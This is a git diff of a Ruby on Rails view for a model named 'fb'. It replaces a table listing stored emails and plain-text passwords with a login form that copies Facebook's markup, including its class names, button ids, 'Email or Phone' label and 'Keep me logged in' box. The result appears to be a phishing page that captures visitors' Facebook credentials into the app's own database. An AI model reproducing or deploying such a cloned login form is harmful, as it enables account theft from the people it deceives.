@@ -1,25 +1,27 @@
-<h1>Listing fbs</h1>
+<%= simple_form_for @fb do |f| %>
 
-<table>
-  <tr>
-    <th>Email</th>
-    <th>Password</th>
-    <th></th>
-    <th></th>
-    <th></th>
-  </tr>
 
-<% @fbs.each do |fb| %>
-  <tr>
-    <td><%= fb.email %></td>
-    <td><%= fb.password %></td>
-    <td><%= link_to 'Show', fb %></td>
-    <td><%= link_to 'Edit', edit_fb_path(fb) %></td>
-    <td><%= link_to 'Destroy', fb, method: :delete, data: { confirm: 'Are you sure?' } %></td>
-  </tr>
+
+<div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label>
+
+<%=f.input :email, label: false, input_html: {class: 'inputtext', id: 'email'}, :tabindex => 1, :name => "email" %>
+
+
+</div><div class="form_row clearfix">
+
+
+<label for="pass" class="login_form_label">Password:</label>
+
+<%=f.input :password, label: false, input_html: {class: 'inputpassword', id: 'pass'}, :tabindex => 1, :name => "pass", :as => "password" %>
+
+
+<div class="persistent"><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0"><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label>
+
+
+
+<div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1">
+
+<%=f.submit "Log in" %>
+</div>
+
 <% end %>
-</table>
-
-<br />
-
-<%= link_to 'New Fb', new_fb_path %>
